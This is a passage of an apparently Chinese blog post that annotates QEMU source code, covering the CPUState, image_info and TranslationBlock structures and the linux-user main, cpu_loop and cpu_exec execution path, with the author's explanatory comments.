class="keyword">uint32_t</span> halted; <span class="comment">/* used by alpha, cris, ppc TCG */</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> u32;</span><br><span class="line">        icount_decr_u16 u16;</span><br><span class="line">    &#125; icount_decr;</span><br><span class="line">    <span class="keyword">uint32_t</span> can_do_io;</span><br><span class="line">    <span class="keyword">int32_t</span> exception_index; <span class="comment">/* used by m68k TCG */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Used to keep track of an outstanding cpu throttle thread for migration</span></span><br><span class="line"><span class="comment">     * autoconverge</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">bool</span> throttle_thread_scheduled;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Note that this is accessed at the start of every TB via a negative</span></span><br><span class="line"><span class="comment">       offset from AREG0.  Leave this field at the end so as to make the</span></span><br><span class="line"><span class="comment">       (absolute value) offset as small as possible.  This reduces code</span></span><br><span class="line"><span class="comment">       size, especially for hosts without large memory offsets.  */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> tcg_exit_req;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h3 id="image-info"><a href="#image-info" class="headerlink" title="image_info"></a>image_info</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">image_info</span> &#123;</span></span><br><span class="line">    abi_ulong load_addr;  <span class="comment">//加载基址</span></span><br><span class="line">    abi_ulong start_code; <span class="comment">//代码起始地址</span></span><br><span class="line">    abi_ulong end_code;   <span class="comment">//代码结束地址</span></span><br><span class="line">    abi_ulong start_data; <span class="comment">//数据段起始地址</span></span><br><span class="line">    abi_ulong end_data;   <span class="comment">//数据段结束地址</span></span><br><span class="line">    abi_ulong start_brk;  <span class="comment">//用于堆分配的brk起始地址</span></span><br><span class="line">    abi_ulong brk;        <span class="comment">//结束地址?</span></span><br><span class="line">    abi_ulong start_mmap;  <span class="comment">//mmap起始地址</span></span><br><span class="line">    abi_ulong mmap;        <span class="comment">//结束?</span></span><br><span class="line">    abi_ulong rss;         </span><br><span class="line">    abi_ulong start_stack;  <span class="comment">//栈起始地址</span></span><br><span class="line">    abi_ulong entry;        <span class="comment">//程序入口点</span></span><br><span class="line">    abi_ulong code_offset;   <span class="comment">//代码段偏移</span></span><br><span class="line">    abi_ulong data_offset;   <span class="comment">//数据段偏移</span></span><br><span class="line">    <span class="keyword">int</span>       personality;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="TranslationBlock"><a href="#TranslationBlock" class="headerlink" title="TranslationBlock"></a>TranslationBlock</h3><p>注释挺全的 哈哈哈 自己看吧<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TranslationBlock</span> &#123;</span></span><br><span class="line">    target_ulong pc;   <span class="comment">/* simulated PC corresponding to this block (EIP + CS base) */</span></span><br><span class="line">    target_ulong cs_base; <span class="comment">/* CS base for this block */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flags; <span class="comment">/* flags defining in which context the code was generated */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> size;      <span class="comment">/* size of target code for this block (1 &lt;=</span></span><br><span class="line"><span class="comment">                           size &lt;= TARGET_PAGE_SIZE) */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> icount;</span><br><span class="line">    <span class="keyword">uint32_t</span> cflags;    <span class="comment">/* compile flags */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CF_COUNT_MASK  0x7fff</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CF_LAST_IO     0x8000 <span class="comment">/* Last insn may be an IO access.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CF_NOCACHE     0x10000 <span class="comment">/* To be freed after execution */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CF_USE_ICOUNT  0x20000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CF_IGNORE_ICOUNT 0x40000 <span class="comment">/* Do not generate icount code */</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *tc_ptr;    <span class="comment">/* pointer to the translated code */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> *tc_search;  <span class="comment">/* pointer to search data */</span></span><br><span class="line">    <span class="comment">/* original tb when cflags has CF_NOCACHE */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TranslationBlock</span> *<span class="title">orig_tb</span>;</span></span><br><span class="line">    <span class="comment">/* first and second physical page containing code. The lower bit</span></span><br><span class="line"><span class="comment">       of the pointer tells the index in page_next[] */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TranslationBlock</span> *<span class="title">page_next</span>[2];</span></span><br><span class="line">    <span class="keyword">tb_page_addr_t</span> page_addr[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The following data are used to directly call another TB from</span></span><br><span class="line"><span class="comment">     * the code of this one. This can be done either by emitting direct or</span></span><br><span class="line"><span class="comment">     * indirect native jump instructions. These jumps are reset so that the TB</span></span><br><span class="line"><span class="comment">     * just continue its execution. The TB can be linked to another one by</span></span><br><span class="line"><span class="comment">     * setting one of the jump targets (or patching the jump instruction). Only</span></span><br><span class="line"><span class="comment">     * two of such jumps are supported.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> jmp_reset_offset[<span class="number">2</span>]; <span class="comment">/* offset of original jump target */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TB_JMP_RESET_OFFSET_INVALID 0xffff <span class="comment">/* indicates no jump generated */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_DIRECT_JUMP</span></span><br><span class="line">    <span class="keyword">uint16_t</span> jmp_insn_offset[<span class="number">2</span>]; <span class="comment">/* offset of native jump instruction */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="keyword">uintptr_t</span> jmp_target_addr[<span class="number">2</span>]; <span class="comment">/* target address for indirect jump */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* Each TB has an assosiated circular list of TBs jumping to this one.</span></span><br><span class="line"><span class="comment">     * jmp_list_first points to the first TB jumping to this one.</span></span><br><span class="line"><span class="comment">     * jmp_list_next is used to point to the next TB in a list.</span></span><br><span class="line"><span class="comment">     * Since each TB can have two jumps, it can participate in two lists.</span></span><br><span class="line"><span class="comment">     * jmp_list_first and jmp_list_next are 4-byte aligned pointers to a</span></span><br><span class="line"><span class="comment">     * TranslationBlock structure, but the two least significant bits of</span></span><br><span class="line"><span class="comment">     * them are used to encode which data field of the pointed TB should</span></span><br><span class="line"><span class="comment">     * be used to traverse the list further from that TB:</span></span><br><span class="line"><span class="comment">     * 0 =&gt; jmp_list_next[0], 1 =&gt; jmp_list_next[1], 2 =&gt; jmp_list_first.</span></span><br><span class="line"><span class="comment">     * In other words, 0/1 tells which jump is used in the pointed TB,</span></span><br><span class="line"><span class="comment">     * and 2 means that this is a pointer back to the target TB of this list.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> jmp_list_next[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">uintptr_t</span> jmp_list_first;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h2 id="部分源码分析"><a href="#部分源码分析" class="headerlink" title="部分源码分析"></a>部分源码分析</h2><h3 id="linux-user-main-c-main"><a href="#linux-user-main-c-main" class="headerlink" title="linux-user/main.c main"></a>linux-user/main.c main</h3><p>只是一部分源码，没细看，等考研结束再看吧<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CPUState *cpu;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 初始化 TCG</span></span><br><span class="line">    tcg_exec_init(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//初始化cpu</span></span><br><span class="line">    cpu = cpu_init(cpu_model);</span><br><span class="line">    <span class="keyword">if</span> (!cpu) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Unable to find CPU definition\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//传递环境和命令行参数到 guest     </span></span><br><span class="line">    target_environ = envlist_to_environ(envlist, <span class="literal">NULL</span>);</span><br><span class="line">    envlist_free(envlist);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 初始化 TaskState 数据结构</span></span><br><span class="line">    init_task_state(ts);</span><br><span class="line">    <span class="comment">/* build Task State */</span></span><br><span class="line">    ts-&gt;info = info; <span class="comment">//被加载程序的一些信息(似乎镜像信息更合适)</span></span><br><span class="line">    ts-&gt;bprm = &amp;bprm;</span><br><span class="line">    cpu-&gt;opaque = ts;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//加载指向guest, regs表示程序入口点</span></span><br><span class="line">    ret = loader_exec(execfd, filename, target_argv, target_environ, regs,</span><br><span class="line">        info, &amp;bprm);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//设置guest的brk指针</span></span><br><span class="line">    target_set_brk(info-&gt;brk);</span><br><span class="line">    <span class="comment">//初始化syscall和signal</span></span><br><span class="line">    syscall_init();</span><br><span class="line">    signal_init();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    根据相应guest 设置cpu</span></span><br><span class="line"><span class="comment">    */</span>    </span><br><span class="line">    <span class="meta">#<span class="meta-keyword">if</span> defined(TARGET_I386)</span></span><br><span class="line">    env-&gt;cr[<span class="number">0</span>] = CR0_PG_MASK | CR0_WP_MASK | CR0_PE_MASK;</span><br><span class="line">    env-&gt;hflags |= HF_PE_MASK | HF_CPL_MASK;</span><br><span class="line">    <span class="keyword">if</span> (env-&gt;features[FEAT_1_EDX] &amp; CPUID_SSE) &#123;</span><br><span class="line">        env-&gt;cr[<span class="number">4</span>] |= CR4_OSFXSR_MASK;</span><br><span class="line">        env-&gt;hflags |= HF_OSFXSR_MASK;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> TARGET_ABI32</span></span><br><span class="line">    <span class="comment">/* enable 64 bit mode if possible */</span></span><br><span class="line">    <span class="keyword">if</span> (!(env-&gt;features[FEAT_8000_0001_EDX] &amp; CPUID_EXT2_LM)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The selected x86 CPU does not support 64 bit mode\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    env-&gt;cr[<span class="number">4</span>] |= CR4_PAE_MASK;</span><br><span class="line">    env-&gt;efer |= MSR_EFER_LMA | MSR_EFER_LME;</span><br><span class="line">    env-&gt;hflags |= HF_LMA_MASK;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    根据给的guest来设置相应的寄存器(64位是不是寄存器有点少啊)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/* linux register setup */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> TARGET_ABI32</span></span><br><span class="line">    env-&gt;regs[R_EAX] = regs-&gt;rax;</span><br><span class="line">    env-&gt;regs[R_EBX] = regs-&gt;rbx;</span><br><span class="line">    env-&gt;regs[R_ECX] = regs-&gt;rcx;</span><br><span class="line">    env-&gt;regs[R_EDX] = regs-&gt;rdx;</span><br><span class="line">    env-&gt;regs[R_ESI] = regs-&gt;rsi;</span><br><span class="line">    env-&gt;regs[R_EDI] = regs-&gt;rdi;</span><br><span class="line">    env-&gt;regs[R_EBP] = regs-&gt;rbp;</span><br><span class="line">    env-&gt;regs[R_ESP] = regs-&gt;rsp;</span><br><span class="line">    env-&gt;eip = regs-&gt;rip;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    env-&gt;regs[R_EAX] = regs-&gt;eax;</span><br><span class="line">    env-&gt;regs[R_EBX] = regs-&gt;ebx;</span><br><span class="line">    env-&gt;regs[R_ECX] = regs-&gt;ecx;</span><br><span class="line">    env-&gt;regs[R_EDX] = regs-&gt;edx;</span><br><span class="line">    env-&gt;regs[R_ESI] = regs-&gt;esi;</span><br><span class="line">    env-&gt;regs[R_EDI] = regs-&gt;edi;</span><br><span class="line">    env-&gt;regs[R_EBP] = regs-&gt;ebp;</span><br><span class="line">    env-&gt;regs[R_ESP] = regs-&gt;esp;</span><br><span class="line">    env-&gt;eip = regs-&gt;eip;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    下面是设置中断和段，还有其他架构的信息，不贴啦</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    主要是cpu_loop这个函数，分析在下面</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    cpu_loop(env);</span><br><span class="line">    <span class="comment">/* never exits */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="linux-user-main-c-tcg-exec-init"><a href="#linux-user-main-c-tcg-exec-init" class="headerlink" title="linux-user/main.c tcg_exec_init"></a>linux-user/main.c tcg_exec_init</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Must be called before using the QEMU cpus. 'tb_size' is the size</span></span><br><span class="line"><span class="comment">   (in bytes) allocated to the translation buffer. Zero means default</span></span><br><span class="line"><span class="comment">   size. */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tcg_exec_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> tb_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    cpu_gen_init()调用tcg_context_init()对tcg_ctx进行初始化，在这个函数好像只设置了nb_globals和helpers，之后调用tcg_target_init设置寄存器？</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    cpu_gen_init();</span><br><span class="line">    page_init();</span><br><span class="line">    tb_htable_init();</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    code_gen_alloc为translate block分配缓冲区</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    code_gen_alloc(tb_size); </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_SOFTMMU)</span></span><br><span class="line">    <span class="comment">/* There's no guest base to take into account, so go ahead and</span></span><br><span class="line"><span class="comment">       initialize the prologue now.  */</span></span><br><span class="line">    <span class="comment">//初始化prologue</span></span><br><span class="line">    tcg_prologue_init(&amp;tcg_ctx);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="linux-user-main-c-cpu-loop"><a href="#linux-user-main-c-cpu-loop" class="headerlink" title="linux-user/main.c cpu_loop"></a>linux-user/main.c cpu_loop</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cpu_loop</span><span class="params">(CPUX86State *env)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CPUState *cs = CPU(x86_env_get_cpu(env));</span><br><span class="line">    <span class="keyword">int</span> trapnr;</span><br><span class="line">    abi_ulong pc;</span><br><span class="line">    abi_ulong ret;</span><br><span class="line">    <span class="keyword">target_siginfo_t</span> info;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(;;) &#123;</span><br><span class="line">        cpu_exec_start(cs); <span class="comment">//加锁，表示cpu正在被占用</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        调用cpu_x86_exec函数进行翻译，并根据相应的返回值做相应处理，如中断和系统调用</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        trapnr = cpu_exec(cs); </span><br><span class="line">        cpu_exec_end(cs); <span class="comment">//释放锁</span></span><br><span class="line">        <span class="keyword">switch</span>(trapnr) &#123;</span><br><span class="line">        <span class="comment">//32位系统调用</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x80</span>:</span><br><span class="line">            <span class="comment">/* linux syscall from int $0x80 */</span></span><br><span class="line">            ret = do_syscall(env,</span><br><span class="line">                             env-&gt;regs[R_EAX],</span><br><span class="line">                             env-&gt;regs[R_EBX],</span><br><span class="line">                             env-&gt;regs[R_ECX],</span><br><span class="line">                             env-&gt;regs[R_EDX],</span><br><span class="line">                             env-&gt;regs[R_ESI],</span><br><span class="line">                             env-&gt;regs[R_EDI],</span><br><span class="line">                             env-&gt;regs[R_EBP],</span><br><span class="line">                             <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (ret == -TARGET_ERESTARTSYS) &#123;</span><br><span class="line">                env-&gt;eip -= <span class="number">2</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret != -TARGET_QEMU_ESIGRETURN) &#123;</span><br><span class="line">                env-&gt;regs[R_EAX] = ret;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> TARGET_ABI32</span></span><br><span class="line">        <span class="comment">//64位系统调用</span></span><br><span class="line">        <span class="keyword">case</span> EXCP_SYSCALL:</span><br><span class="line">            <span class="comment">/* linux syscall from syscall instruction */</span></span><br><span class="line">            ret = do_syscall(env,</span><br><span class="line">                             env-&gt;regs[R_EAX],</span><br><span class="line">                             env-&gt;regs[R_EDI],</span><br><span class="line">                             env-&gt;regs[R_ESI],</span><br><span class="line">                             env-&gt;regs[R_EDX],</span><br><span class="line">                             env-&gt;regs[<span class="number">10</span>],</span><br><span class="line">                             env-&gt;regs[<span class="number">8</span>],</span><br><span class="line">                             env-&gt;regs[<span class="number">9</span>],</span><br><span class="line">                             <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (ret == -TARGET_ERESTARTSYS) &#123;</span><br><span class="line">                env-&gt;eip -= <span class="number">2</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret != -TARGET_QEMU_ESIGRETURN) &#123;</span><br><span class="line">                <span class="comment">//结果存到eax</span></span><br><span class="line">                env-&gt;regs[R_EAX] = ret;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">case</span> EXCP0B_NOSEG:</span><br><span class="line">        </span><br><span class="line">        .....</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            pc = env-&gt;segs[R_CS].base + env-&gt;eip;</span><br><span class="line">            EXCP_DUMP(env, <span class="string">"qemu: 0x%08lx: unhandled CPU exception 0x%x - aborting\n"</span>,</span><br><span class="line">                      (<span class="keyword">long</span>)pc, trapnr);</span><br><span class="line">            <span class="built_in">abort</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        process_pending_signals(env);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cpu-exec-c-cpu-exec"><a href="#cpu-exec-c-cpu-exec" class="headerlink" title="cpu-exec.c cpu_exec"></a>cpu-exec.c cpu_exec</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* main execution loop */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cpu_exec</span><span class="params">(CPUState *cpu)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//CPUClass类似于c++的虚表，存放了一组函数指针</span></span><br><span class="line">    CPUClass *cc = CPU_GET_CLASS(cpu);</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    SyncClocks sc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//保存当前cpu状态</span></span><br><span class="line">    <span class="comment">/* replay_interrupt may need current_cpu */</span></span><br><span class="line">    current_cpu = cpu;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">//对env-&gt;eflags进行初始化</span></span><br><span class="line">    cc-&gt;cpu_exec_enter(cpu);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Calculate difference between guest clock and host clock.</span></span><br><span class="line"><span class="comment">     * This delay includes the delay of the last cycle, so</span></span><br><span class="line"><span class="comment">     * what we have to do is sleep until it is 0. As for the</span></span><br><span class="line"><span class="comment">     * advance/delay we gain here, we try to fix it next time.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">     <span class="comment">//好像和时钟周期有关?</span></span><br><span class="line">    init_delay_params(&amp;sc, cpu);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(;;) &#123;</span><br><span class="line">        <span class="comment">/* prepare setjmp context for exception handling */</span></span><br><span class="line">        <span class="comment">//正常情况下会进入if,不大懂可以查下sigsetjmp</span></span><br><span class="line">        <span class="keyword">if</span> (sigsetjmp(cpu-&gt;jmp_env, <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            TranslationBlock *tb, *last_tb = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">int</span> tb_exit = <span class="number">0</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//如果有异常发生，并且不能处理则跳出</span></span><br><span class="line">            <span class="comment">/* if an exception is pending, we execute it here */</span></span><br><span class="line">            <span class="keyword">if</span> (cpu_handle_exception(cpu, &amp;ret)) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span 